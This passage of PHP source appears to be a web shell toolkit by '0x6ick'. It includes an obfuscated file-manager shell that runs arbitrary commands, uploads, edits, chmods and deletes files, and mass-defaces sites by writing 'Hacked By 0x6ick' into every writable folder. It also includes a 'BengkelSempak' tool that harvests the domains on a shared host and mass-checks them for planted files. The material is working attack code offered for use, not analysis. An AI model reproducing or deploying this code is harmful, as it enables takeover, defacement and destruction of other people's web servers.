                    $res .= "[<font color=lime>DONE</font>] ".$f[28]($lokasi.DIRECTORY_SEPARATOR.$file)."<br>";
                    mass_deface_recursive($lokasi, $file, $content, $res);
                } else { $res .= "[<font color=red>FAILED</font>] ".$f[28]($lokasi)." (Not Writable)<br>"; }
            }
        }
    }
    function mass_deface_flat($dir, $file, $content, &$res) {
        global $f;
        if(!$f[26]($dir)) {$res .= "[<font color=red>FAILED</font>] ".$f[28]($dir)." (Not Writable)<br>"; return;}
        foreach($f[19]($dir) as $item) {
            if($item === '.' || $item === '..') continue;
            $lokasi = $dir.DIRECTORY_SEPARATOR.$item;
            if($f[17]($lokasi) && $f[26]($lokasi)) {
                $f[27]($lokasi.DIRECTORY_SEPARATOR.$file, $content);
                $res .= "[<font color=lime>DONE</font>] ".$f[28]($lokasi.DIRECTORY_SEPARATOR.$file)."<br>";
            }
        }
    }
    if($_POST['tipe_sabun'] == 'mahal') mass_deface_recursive($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results);
    else mass_deface_flat($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results);
    $_SESSION['feature_output'] = $mass_deface_results;
    redirect_with_message('success', 'Mass Deface Selesai!', $path);
}

if(isset($_FILES['file_upload'])){
    $file_name = sanitizeFilename($_FILES['file_upload']['name']);
    if($f[29]($_FILES['file_upload']['tmp_name'], $path.'/'.$file_name)) redirect_with_message('success', 'UPLOAD SUCCESS: ' . $file_name, $path);
    else redirect_with_message('error', 'File Gagal Diupload !!', $path);
}

// MODIFIED: Bulk action handler logic
if (isset($_POST['bulk_action']) && isset($_POST['selected_files'])) {
    $action = $_POST['bulk_action'];
    $selected_files = $_POST['selected_files'];

    // Handle Zip Action
    if ($action === 'zip_selected' && $f[30]('ZipArchive')) {
        $zip_filename = 'archive_' . $f[31]('Y-m-d_H-i-s') . '.zip';
        $zip_filepath = $path . DIRECTORY_SEPARATOR . $zip_filename;
        $zip = new ZipArchive();
        if ($zip->open($zip_filepath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($selected_files as $file) {
                $file_path = $f[23]($file);
                if ($f[43]($file_path)) $zip->addFile($file_path, $f[5]($file_path));
                elseif ($f[17]($file_path)) zip_add_folder($zip, $file_path, $f[33]($f[32]($file_path) . DIRECTORY_SEPARATOR));
            }
            $zip->close();
            redirect_with_message('success', 'File berhasil di-zip ke: ' . $zip_filename, $path);
        } else {
            redirect_with_message('error', 'Gagal membuat file zip!', $path);
        }
    }
    // ADDED: Handle Delete Action
    elseif ($action === 'delete_selected') {
        foreach ($selected_files as $file_to_delete) {
            delete_recursive($file_to_delete);
        }
        redirect_with_message('success', 'Item yang dipilih berhasil dihapus.', $path);
    }
}

if(isset($_GET['option']) && isset($_POST['opt_action'])){
    $target_full_path = $_POST['path_target'];
    $action = $_POST['opt_action'];
    $current_dir = $f[23](isset($_GET['path']) ? $_GET['path'] : $f[24]());
    switch ($action) {
        case 'delete':
            if (delete_recursive($target_full_path)) redirect_with_message('success', 'DELETE SUCCESS !!', $current_dir);
            else redirect_with_message('error', 'Gagal menghapus! Periksa izin.', $current_dir);
            break;
        case 'chmod_save':
            if($f[34]($target_full_path, $f[35]($_POST['perm_value']))) redirect_with_message('success', 'CHMOD SUCCESS !!', $current_dir);
            else redirect_with_message('error', 'CHMOD Gagal !!', $current_dir);
            break;
        case 'rename_save':
            $new_full_path = $f[32]($target_full_path).'/'.sanitizeFilename($_POST['new_name_value']);
            if($f[36]($target_full_path, $new_full_path)) redirect_with_message('success', 'RENAME SUCCESS !!', $current_dir);
            else redirect_with_message('error', 'RENAME Gagal !!', $current_dir);
            break;
        case 'edit_save':
            if($f[26]($target_full_path)) {
                if($f[27]($target_full_path, $_POST['src_content'])) redirect_with_message('success', 'EDIT SUCCESS !!', $current_dir);
                else redirect_with_message('error', 'Edit File Gagal !!', $current_dir);
            } else { redirect_with_message('error', 'File tidak writable!', $current_dir); }
            break;
        case 'extract_save':
            if ($f[30]('ZipArchive')) {
                $zip = new ZipArchive;
                if ($zip->open($target_full_path) === TRUE) {
                    $zip->extractTo($current_dir);
                    $zip->close();
                    redirect_with_message('success', 'File berhasil diekstrak!', $current_dir);
                } else { redirect_with_message('error', 'Gagal membuka file zip!', $current_dir); }
            } else { redirect_with_message('error', 'Class ZipArchive tidak ditemukan!', $current_dir); }
            break;
    }
}

if(isset($_GET['create_new'])) {
    $target_path_new = $path . '/' . sanitizeFilename($_POST['create_name']);
    if ($_POST['create_type'] == 'file') {
        if (@$f[27]($target_path_new, '') !== false) redirect_with_message('success', 'File Baru Berhasil Dibuat', $path);
        else redirect_with_message('error', 'Gagal membuat file baru!', $path);
    } elseif ($_POST['create_type'] == 'dir') {
        if (@$f[37]($target_path_new)) redirect_with_message('success', 'Folder Baru Berhasil Dibuat', $path);
        else redirect_with_message('error', 'Gagal membuat folder baru!', $path);
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<title><?php echo $f[28]($title); ?></title>
<style>
body{font-family:'Kelly Slab',cursive;background-color:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>;margin:0;padding:0;}
a{font-size:1em;color:<?php echo $theme_link;?>;text-decoration:none;}
a:hover{color:<?php echo $theme_link_hover;?>;}
table{border-collapse:collapse;width:95%;max-width:1200px;margin:15px auto;}
.table_home,.td_home{border:2px solid <?php echo $theme_table_row_hover;?>;padding:7px;vertical-align:middle;}
#content tr:hover{background-color:<?php echo $theme_table_row_hover;?>;}
#content .first{background-color:<?php echo $theme_table_header_bg;?>;font-weight:bold;}
input,select,textarea{border:1px solid <?php echo $theme_link_hover;?>;border-radius:5px;background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_input_fg;?>;font-family:'Kelly Slab',cursive;padding:5px;box-sizing:border-box;}
input[type="submit"]{background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_fg;?>;border:2px solid <?php echo $theme_fg;?>;cursor:pointer;font-weight:bold;}
input[type="submit"]:hover{background:<?php echo $theme_fg;?>;color:<?php echo $theme_input_bg;?>;}
h1{font-family:'Kelly Slab';font-size:35px;color:white;margin:20px 0 10px;text-align:center;}
.path-nav{margin:10px auto;width:95%;max-width:1200px;text-align:left;word-wrap:break-word;}
.message{padding:10px;margin:10px auto;border-radius:5px;width:95%;max-width:1200px;font-weight:bold;text-align:center;}
.message.success{background-color:<?php echo $message_success_color;?>;color:<?php echo $theme_bg;?>;}
.message.error{background-color:<?php echo $message_error_color;?>;color:white;}
.section-box{background-color:#1a1a1a;border:1px solid <?php echo $theme_border_color;?>;padding:15px;margin:20px auto;border-radius:8px;width:95%;max-width:1200px;}
.main-menu{margin:20px auto;width:95%;max-width:1200px;text-align:center;padding:10px 0;border-top:1px solid <?php echo $theme_border_color;?>;border-bottom:1px solid <?php echo $theme_border_color;?>;}
.main-menu a{margin:0 8px;font-size:1.1em;white-space:nowrap;}
pre{background-color:#0e0e0e;border:1px solid #444;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;color:#00FFD1;}
</style>
</head>
<body>
<a href="?"><h1 style="color: white;"><?php echo $f[28]($title); ?></h1></a>
<?php
if(isset($_GET['msg_text'])) { echo "<div class='message ".$f[28]($_GET['msg_type'])."'>".$f[28]($_GET['msg_text'])."</div>"; }
if(isset($_SESSION['feature_output'])) { echo '<div class="section-box"><h4>Hasil Fitur Sebelumnya:</h4><pre>'.$_SESSION['feature_output'].'</pre></div>'; unset($_SESSION['feature_output']); }
?>
<table class="system-info-table" width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>
<font color='white'><i class='fa fa-user'></i> User / IP </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $_SERVER['REMOTE_ADDR']; ?></font>
<tr><td><font color='white'><i class='fa fa-desktop'></i> Host / Server </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $f[39]($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']; ?></font>
<tr><td><font color='white'><i class='fa fa-hdd-o'></i> System </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $f[40](); ?></font>
</tr></td></table>
<div class="main-menu">
    <a href="?path=<?php echo $f[38]($path); ?>&action=cmd">Command</a> |
    <a href="?path=<?php echo $f[38]($path); ?>&action=upload_form">Upload</a> |
    <a href="?path=<?php echo $f[38]($path); ?>&action=mass_deface_form">Mass Deface</a> |
    <a href="?path=<?php echo $f[38]($path); ?>&action=create_form">Create</a>
</div>
<div class="path-nav">
    <i class="fa fa-folder-o"></i> :
    <?php
    $paths_array = $f[41]('/', $f[42]($path, '/'));
    echo '<a href="?path=/">/</a>';
    $current_built_path = '';
    foreach($paths_array as $pat){
        if(empty($pat)) continue;
        $current_built_path .= '/' . $pat;
        echo '<a href="?path='.$f[38]($current_built_path).'">'.$f[28]($pat).'</a>/';
    }
    ?>
</div>
<?php
$show_file_list = true;
if (isset($_GET['action'])) {
    $show_file_list = false;
    echo '<div class="section-box">';
    switch ($_GET['action']) {
        case 'cmd':
            $cmd_output = (isset($_POST['do_cmd'])) ? $f[28](exe($_POST['cmd_input'])) : '';
            echo '<h3>Execute Command</h3><form method="POST" action="?action=cmd&path='.$f[38]($path).'"><input type="text" name="cmd_input" placeholder="whoami" style="width: calc(100% - 80px);" autofocus><input type="submit" name="do_cmd" value=">>" style="width: 70px;"></form>';
            if($cmd_output) echo '<h4>Output:</h4><pre>'.$cmd_output.'</pre>';
            break;
        case 'upload_form':
            echo '<h3>Upload File</h3><form enctype="multipart/form-data" method="POST" action="?path='.$f[38]($path).'"><input type="file" name="file_upload" required/><input type="submit" value="UPLOAD" style="margin-left:10px;"/></form>';
            break;
        case 'mass_deface_form':
            echo '<h3>Mass Deface</h3><form method="post" action="?path='.$f[38]($path).'"><p>Tipe:<br><input type="radio" name="tipe_sabun" value="murah" checked>Biasa (1 level) | <input type="radio" name="tipe_sabun" value="mahal">Massal (Rekursif)</p><p>Folder Target:<br><input type="text" name="d_dir" value="'.$f[28]($path).'" style="width:100%"></p><p>Nama File:<br><input type="text" name="d_file" value="index.html" style="width:100%"></p><p>Isi Script:<br><textarea name="script_content" style="width:100%;height:150px">Hacked By 0x6ick</textarea></p><input type="submit" name="start_mass_deface" value="GAS!" style="width:100%"></form>';
            break;
        case 'create_form':
            echo '<h3>Create New</h3><form method="POST" action="?create_new=true&path='.$f[38]($path).'"><select name="create_type"><option value="file">File</option><option value="dir">Folder</option></select> <input type="text" name="create_name" required placeholder="Nama file/folder"> <input type="submit" value="Create"></form>';
            break;
        case 'delete':
            echo '<h3>Konfirmasi Hapus: '.$f[28]($f[5]($_GET['target_file'])).'</h3><p style="color:red;text-align:center;">Anda YAKIN? Tindakan ini tidak bisa dibatalkan.</p><form method="POST" action="?option=true&path='.$f[38]($path).'"><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="delete"><input type="submit" value="YA, HAPUS" style="background:red;color:white;"/> <a href="?path='.$f[38]($path).'" style="margin-left:10px;">BATAL</a></form>';
            break;
        case 'extract_form':
            echo '<h3>Konfirmasi Ekstrak: '.$f[28]($f[5]($_GET['target_file'])).'</h3><p>Ekstrak semua isi file ini ke direktori saat ini ('.$f[28]($path).')?</p><form method="POST" action="?option=true&path='.$f[38]($path).'"><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="extract_save"><input type="submit" value="YA, EKSTRAK"/> <a href="?path='.$f[38]($path).'" style="margin-left:10px;">BATAL</a></form>';
            break;
        case 'view_file':
            echo '<h3>Viewing: '.$f[28]($f[5]($_GET['target_file'])).'</h3><textarea style="width:100%;height:400px;" readonly>'.$f[28](@$f[50]($_GET['target_file'])).'</textarea>';
            break;
        case 'edit_form':
            echo '<h3>Editing: '.$f[28]($f[5]($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'"><textarea name="src_content" style="width:100%;height:400px;">'.$f[28](@$f[50]($_GET['target_file'])).'</textarea><br><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="edit_save"><input type="submit" value="SAVE"/></form>';
            break;
        case 'rename_form':
            echo '<h3>Rename: '.$f[28]($f[5]($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'">New Name: <input name="new_name_value" type="text" value="'.$f[28]($f[5]($_GET['target_file'])).'"/><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="rename_save"><input type="submit" value="RENAME"/></form>';
            break;
        case 'chmod_form':
            $current_perms = $f[21]($f[15]('%o', @$f[14]($_GET['target_file'])), -4);
            echo '<h3>Chmod: '.$f[28]($f[5]($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'">Permission: <input name="perm_value" type="text" size="4" value="'.$current_perms.'"/><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="chmod_save"><input type="submit" value="CHMOD"/></form>';
            break;
    }
    echo '</div>';
}

if ($show_file_list) {
    echo '<form method="POST" action="?path='.$f[38]($path).'">';
    echo '<div id="content"><table><tr class="first">';
    echo '<th><input type="checkbox" onclick="document.querySelectorAll(\'.file-checkbox\').forEach(e=>e.checked=this.checked);"></th>';
    echo '<th>Name</th><th>Size</th><th>Perm</th><th>Options</th></tr>';
    $scandir_items = @$f[19]($path);
    if ($scandir_items) {
        $f[47]($scandir_items, function($a, $b) use ($path, $f) {
            if ($a == '..') return -1; if ($b == '..') return 1;
            if ($f[17]($path.'/'.$a) && !$f[17]($path.'/'.$b)) return -1;
            if (!$f[17]($path.'/'.$a) && $f[17]($path.'/'.$b)) return 1;
            return $f[48]($a, $b);
        });
        foreach($scandir_items as $item){
            if($item == '.') continue;
            $full_item_path = $path.DIRECTORY_SEPARATOR.$item;
            $encoded_full_item_path = $f[38]($full_item_path);
            echo "<tr><td class='td_home' style='text-align:center;'>";
            if ($item != '..') echo "<input type='checkbox' class='file-checkbox' name='selected_files[]' value='".$f[28]($full_item_path)."'>";
            echo "</td><td class='td_home'>";
            if($item == '..') echo "<i class='fa fa-folder-open-o'></i> <a href=\"?path=".$f[38]($f[32]($path))."\">".$f[28]($item)."</a>";
            elseif($f[17]($full_item_path)) echo "<i class='fa fa-folder-o'></i> <a href=\"?path=$encoded_full_item_path\">".$f[28]($item)."</a>";
            else echo "<i class='fa fa-file-o'></i> <a href=\"?action=view_file&target_file=$encoded_full_item_path&path=".$f[38]($path)."\">".$f[28]($item)."</a>";
            echo "</td><td class='td_home' style='text-align:center;'>".($f[43]($full_item_path) ? $f[44](@$f[45]($full_item_path)/1024,2).' KB' : '--')."</td>";
            echo "<td class='td_home' style='text-align:center;'><font color='".($f[26]($full_item_path) ? '#57FF00' : (!$f[46]($full_item_path) ? '#FF0004' : $theme_fg))."'>".perms($full_item_path)."</font></td>";
            echo "<td class='td_home' style='text-align:center;'><select style='width:100px;' onchange=\"if(this.value) window.location.href='?action='+this.value+'&target_file={$encoded_full_item_path}&path=".$f[38]($path)."'\"><option value=''>Action</option><option value='delete'>Delete</option>";
            if($f[43]($full_item_path)) {
                echo "<option value='edit_form'>Edit</option>";
                if($f[30]('ZipArchive') && $f[49]($full_item_path, PATHINFO_EXTENSION) == 'zip') echo "<option value='extract_form'>Extract</option>";
            }
            echo "<option value='rename_form'>Rename</option><option value='chmod_form'>Chmod</option></select></td></tr>";
        }
    } else { echo "<tr><td colspan='5' style='text-align:center;'><font color='red'>Gagal membaca direktori.</font></td></tr>"; }
    // MODIFIED: Bulk action dropdown
    if ($f[30]('ZipArchive')) {
        echo '<tfoot><tr class="first"><td colspan="5" style="padding:10px;">With selected: <select name="bulk_action"><option value="">Choose...</option><option value="zip_selected">Zip</option><option value="delete_selected">Hapus</option></select> <input type="submit" value="Go"></td></tr></tfoot>'; // ADDED: delete_selected option
    }
    echo '</table></div></form>';
}
?>
<hr style="border-top: 1px solid <?php echo $theme_border_color; ?>; width: 95%; max-width: 1200px; margin: 15px auto;">
<center><font color="#fff" size="2px"><b>Coded With &#x1f497; by <font color="#7e52c6"><?php echo $f[28]($author); ?></font></b></center>
</body>
</html>
PHP;
}
function sempak() {
    return <<<'PHP'
<?php
// TOOLS GABUT
error_reporting(0);
set_time_limit(0);

// -------------------- Helpers --------------------
function is_possible_domain_folder($name) {
    return preg_match('/^([a-z0-9-]+\.)+[a-z]{2,}$/i', $name);
}
function normalize_lines($text){
    if ($text === null) return [];
    return preg_split("/\r\n|\n|\r/", trim($text));
}

// -------------------- Global Variables --------------------
$active_tool = 'grabber';
$grabber_output = '';
$ext_output = '';
$checker_output = '';
$checker_found_list_string = '';

// -------------------- MAIN LOGIC ROUTER --------------------

// --- 1. DOMAIN GRABBER (Runs on GET 'path') ---
$defaultPath = realpath(dirname(__FILE__)) . '/';
$baseInput = $_GET['path'] ?? '';
if ($baseInput !== '') {
    $active_tool = 'grabber';
    $base = rtrim($baseInput, '/') . '/';
    $domains_list = [];
    if (is_dir($base)) {
        $dirs = scandir($base);
        foreach ($dirs as $d) {
            if ($d === '.' || $d === '..') continue;
            if (is_dir($base . $d) && is_possible_domain_folder($d)) {
                $domains_list[] = "http://$d/";
            }
        }
        sort($domains_list);
        $grabber_output = implode(PHP_EOL, $domains_list);
    } else {
        $grabber_output = "ERROR: Path not found or is not a directory:\n" . htmlspecialchars($base);
    }
}

// --- 2. POST LOGIC (EXT Generator & Mass Checker) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {

    // --- 2a. EXT GENERATOR ---
    if ($_POST['action'] === 'ext_generate') {
        $active_tool = 'ext';
        $input_text = trim($_POST['urllist'] ?? '');
        $old_ext = trim($_POST['oldext'] ?? '');
        $new_ext = trim($_POST['newext'] ?? '');
        $lines = normalize_lines($input_text);
        $results = [];
        
        foreach ($lines as $url) {
            $u = trim($url);
            if ($u === '') continue;
            if ($old_ext !== '' && substr($u, -strlen($old_ext)) === $old_ext) {
                $results[] = substr($u, 0, -strlen($old_ext)) . $new_ext;
            } else {
                $results[] = $u . $new_ext;
            }
        }
        sort($results);
        $ext_output = implode(PHP_EOL, $results);
        @file_put_contents('ext.txt', $ext_output);
    }
     // --- 2b. MASS CHECKER ---
    if ($_POST['action'] === 'mass_check') {
        $active_tool = 'checker';
        
        ob_start(); // Start output buffering to catch all 'echo'
        
        $urls_raw = explode("\n", trim($_POST['urls']));
        $ext     = trim($_POST['ext']);
        $keyword = trim($_POST['keyword']);
        $mode    = $_POST['mode'] ?? 'normal';
        $target_mode = $_POST['target_mode'] ?? 'root';
        
        $urls = [];
        foreach ($urls_raw as $u) {
            if (trim($u) !== '') $urls[] = trim($u);
        }
        
        $keyword_is_empty = ($keyword === '');
        $total_urls = count($urls);
        $counts = ['found' => 0, 'miss' => 0, 'error' => 0, 'skip' => 0];
        $current_url = 1;
        
        // Summary
        echo '<div id="summary-box" class="summary-box">';
        echo '<div>TOTAL: <span id="s-total">' . $total_urls . '</span></div>';
        echo '<div>FOUND: <span id="s-found" style="color:lime">0</span></div>';
        echo '<div>MISS: <span id="s-miss" style="color:red">0</span></div>';
        echo '<div>ERRORS: <span id="s-error" style="color:orange">0</span></div>';
        echo '</div>';
        
        echo "<h4>Scan Results (Scan Mode: " . htmlspecialchars($mode) . " | Target Mode: " . htmlspecialchars($target_mode) . ")</h4>";
        
        $found_list = [];

        // --- FAST MODE (cURL) ---
        if ($mode === 'fast') {
            $multi_handle = curl_multi_init();
            $curl_handles = [];
            $url_map      = [];

            foreach ($urls as $url_input) {
                $test_url = $url_input;
                if (strpos($test_url, '://') === false) $test_url = 'http://' . $test_url;
                if (!filter_var($test_url, FILTER_VALIDATE_URL)) {
                    echo "<span style='color:orange'>($current_url/$total_urls) [SKIP]</span> Invalid Base URL: " . htmlspecialchars($url_input) . "<br>";
                    $counts['skip']++; $current_url++; continue;
                }
                
                $target = '';
                if ($target_mode === 'path') {
                    $base_url = preg_replace('/\/[^\/]*$/', '', $url_input);
                    $target = rtrim($base_url, '/') . '/' . $ext;
                } else {
                    $parsed_url = parse_url($test_url);
                    $target = ($parsed_url['scheme'] ?? 'http') . '://' . $parsed_url['host'] . '/' . $ext;
                }

                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL => $target, CURLOPT_RETURNTRANSFER => true, CURLOPT_HEADER => false,
                    CURLOPT_TIMEOUT => 15, CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
                ]);
                curl_multi_add_handle($multi_handle, $ch);
                $curl_handles[] = $ch;
                $url_map[(string)$ch] = $target;
            }

            $running = null;
            do { curl_multi_exec($multi_handle, $running); usleep(100); } while ($running > 0);

            foreach ($curl_handles as $ch) {
                $target     = $url_map[(string)$ch];
                $resp       = curl_multi_getcontent($ch);
                $http_code  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curl_error = curl_error($ch);
                $condition_met = false;

                if ($curl_error || $http_code == 0) {
                    echo "<span style='color:orange'>($current_url/$total_urls) [ERROR]</span> " . htmlspecialchars($target) . " <small>(cURL Error: " . htmlspecialchars($curl_error ? $curl_error : 'Connection Failed') . ")</small><br>";
                    $counts['error']++;
                } else {
                    if ($keyword_is_empty) { $condition_met = ($http_code == 200); }
                    else { $condition_met = ($http_code == 200 && $resp !== false && strpos($resp, $keyword) !== false); }
                    
                    if ($condition_met) {
                        echo "<span style='color:lime'>($current_url/$total_urls) [FOUND]</span> " . htmlspecialchars($target) . "<br>";
                        $counts['found']++; $found_list[] = $target;
                    } else {
                        echo "<span style='color:red'>($current_url/$total_urls) [MISS]</span> " . htmlspecialchars($target) . " <small>(Code: $http_code)</small><br>";
                        $counts['miss']++;
                    }
                }
                curl_multi_remove_handle($multi_handle, $ch);
                
                $current_url++;
            }
            curl_multi_close($multi_handle);
        }
        
        else {
            foreach ($urls as $url_input) {
                $test_url = $url_input;
                if (strpos($test_url, '://') === false) $test_url = 'http://' . $test_url;
                if (!filter_var($test_url, FILTER_VALIDATE_URL)) {
                    echo "<span style='color:orange'>($current_url/$total_urls) [SKIP]</span> Invalid Base URL: " . htmlspecialchars($url_input) . "<br>";
                    $counts['skip']++; $current_url++; continue;
                }

                $target = '';
                if ($target_mode === 'path') {
                    $base_url = preg_replace('/\/[^\/]*$/', '', $url_input);
                    $target = rtrim($base_url, '/') . '/' . $ext;
                } else {
                    $parsed_url = parse_url($test_url);
                    $target = ($parsed_url['scheme'] ?? 'http') . '://' . $parsed_url['host'] . '/' . $ext;
                }
                
                $context = stream_context_create([
                    "ssl" => ["verify_peer" => false, "verify_peer_name" => false],
                    "http" => [
                        "timeout" => 15,
                        "user_agent" => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
                    ]
                ]);
                
                $resp = @file_get_contents($target, false, $context);
                $condition_met = false;

                if ($resp === false) {
                    if (!isset($http_response_header)) {
                        echo "<span style='color:orange'>($current_url/$total_urls) [ERROR]</span> " . htmlspecialchars($target) . " <small>(Connection Failed)</small><br>";
                        $counts['error']++;
                    } else {
                        preg_match('/HTTP\/.* (\d{3})/', $http_response_header[0], $matches);
                        $http_code = $matches[1] ?? 'N/A';
                        echo "<span style='color:red'>($current_url/$total_urls) [MISS]</span> " . htmlspecialchars($target) . " <small>(Code: $http_code)</small><br>";
                        $counts['miss']++;
                    }
                } else {
                    if ($keyword_is_empty) { $condition_met = true; }
                    else { $condition_met = (strpos($resp, $keyword) !== false); }
                    
                    if ($condition_met) {
                        echo "<span style='color:lime'>($current_url/$total_urls) [FOUND]</span> " . htmlspecialchars($target) . "<br>";
                        $counts['found']++; $found_list[] = $target;
                    } else {
                        echo "<span style='color:red'>($current_url/$total_urls) [MISS]</span> " . htmlspecialchars($target) . " <small>(Keyword Not Found)</small><br>";
                        $counts['miss']++;
                    }
                }

                $current_url++;
            }
        }

        if (!empty($found_list)) {
            file_put_contents('found.txt', implode(PHP_EOL, $found_list) . PHP_EOL, FILE_APPEND);
            $checker_found_list_string = implode(PHP_EOL, $found_list);
        }
        echo "<br><a href='found.txt' target='blank' class='download'>Download found.txt</a>";
        

        echo "<script>";
        echo "document.getElementById('s-found').innerText = '" . $counts['found'] . "';";
        echo "document.getElementById('s-miss').innerText = '" . $counts['miss'] . "';";
        echo "document.getElementById('s-error').innerText = '" . $counts['error'] + $counts['skip'] . "';";
        echo "</script>";

        // Get buffered output and assign to variable
        $checker_output = ob_get_clean(); 
    }
}
// This closes the PHP block before HTML starts
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>BengkelSempak</title>
<style>
:root {
  --bg-deep: #121212;     
  --bg-main: #1a1a1a;     
  --text-main: #e0e0e0;   
  --text-muted: #8899aa;  
  --accent: #00f0e6;      
  --border: #334455;      
  --title: #ffffff;       
  --found: #50fa7b;       
  --miss: #ff5555;        
}

*{box-sizing:border-box}
body{
  margin:0; font-family:"Courier New",Courier,monospace;
  
  background: linear-gradient(180deg, var(--bg-deep) 0%, var(--bg-main) 100%);
  
  color: var(--text-main); 
  display:flex; justify-content:center; padding:26px;
}
.wrap{width:100%;max-width:980px}
.header{text-align:center;margin-bottom:14px}
.title{
  font-size:42px;
  
  color: var(--title);
  
  text-shadow: 0 0 10px rgba(0, 240, 230, 0.2); 
  letter-spacing:2px;margin:6px 0;font-weight:700
}
.card{
  background:transparent;
  padding:14px;border-radius:8px;
  border: 1px solid var(--border);
}
.tabs{display:flex;gap:8px;margin:16px 0}
.tab{
  flex:1;padding:12px;
  background:rgba(0,0,0,0.5);
  border: 1px solid var(--border);
  color: var(--text-muted); 
  text-align:center;cursor:pointer;border-radius:6px;font-weight:600;
  transition: all 0.2s ease;
}
.tab:hover {
  color: var(--text-main);
  border-color: var(--accent);
}
.tab.active{
  background: var(--accent); 
  color: var(--bg-deep); 
  box-shadow: 0 0 18px rgba(0, 240, 230, 0.2);
  border-color: var(--accent);
}
.panel{
  margin-top:12px;padding:16px;border-radius:8px;
  background: var(--bg-deep);
  border: 1px solid var(--border);
  display:none;
}
label{
  display:block;
  color: var(--text-muted);
  margin:8px 0 6px;font-size:14px
}
.input, textarea, select {
  width:100%;padding:10px 12px;
  background:transparent;
  border: 1px solid var(--border);
  color: var(--text-main); 
  border-radius:6px;outline:none;font-family:inherit;
  transition: all 0.2s ease;
}

.input:focus, textarea:focus, select:focus {
  border-color: var(--accent);
  box-shadow: 0 0 10px rgba(0, 240, 230, 0.2);
}
textarea{min-height:140px;resize:vertical}
.btn{
  display:inline-block;
  background: var(--accent);
  color: var(--bg-deep); 
  padding:10px 18px;margin-top:10px;border-radius:6px;
  font-weight:700;cursor:pointer;border:0;
  transition: all 0.2s ease;
}
.btn:hover {
  opacity: 0.8;
}
.btn.secondary{
  background: transparent;
  color: var(--accent);
  border: 1px solid var(--accent);
}
.btn.secondary:hover {
  background: var(--accent);
  color: var(--bg-deep);
  opacity: 1;
}
.small{
  font-size:13px;
  color: var(--text-muted); 
}
.result{
  margin-top:12px;padding:12px;
  background: var(--bg-deep); 
  border: 1px dashed var(--border); 
  border-radius:6px;
  color: var(--text-main); 
  white-space:pre-wrap;font-family:monospace
}
.footer{
  text-align:center;
  color: var(--text-muted); 
  margin-top:18px;font-size:13px
}
.flex{display:flex;gap:10px;align-items:flex-start}
.col{flex:1}
a.download{
  color: var(--accent); 
  font-weight:700;text-decoration:none
}
.checker-result { 
  margin-top:15px; padding:10px; 
  background: #000; 
  border-radius: 5px; border: 1px solid var(--border); 
  max-height: 300px; overflow-y: auto; 
}
//t.me/yungx6ick
.checker-result span[style*="color:lime"] { color: var(--found) !important; }
.checker-result span[style*="color:red"] { color: var(--miss) !important; }
.checker-result span[style*="color:orange"] { color: #ffb86c !important; } 

.summary-box {
  display: flex;
  justify-content: space-around;
  background: var(--bg-deep); 
  padding: 15px;
  border-radius: 6px;
  border: 1px solid var(--accent); 
  margin-bottom: 15px;
  font-size: 1.2em;
  font-weight: bold;
}

.summary-box span[style*="color:lime"] { color: var(--found) !important; }
.summary-box span[style*="color:red"] { color: var(--miss) !important; }

.summary-box div {
  flex: 1;
  text-align: center;
}
</style>
<script>
function showTab(id){
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
  document.getElementById('tab-'+id).classList.add('active');
  document.getElementById('panel-'+id).style.display='block';
}
function copyTxt(id){
  const el = document.getElementById(id);
  if (!el) return;
  navigator.clipboard.writeText(el.value).then(()=>alert('Copied!'));
}
//0x6ick.my.id
window.addEventListener('DOMContentLoaded', ()=> showTab('<?php echo $active_tool; ?>'));
</script>
</head>
<body>
<div class="wrap">
  <div class="header">
    <div class="title">BengkelSempak</div>
    <div class="small">Tidak ada yang sia-sia,bahkan sempak juga punya manfaat.</div>
  </div>

  <div class="card">
    <div class="tabs">
      <div class="tab" id="tab-grabber" onclick="showTab('grabber')">Domain Grabber</div>
      <div class="tab" id="tab-ext" onclick="showTab('ext')">EXT Generator</div>
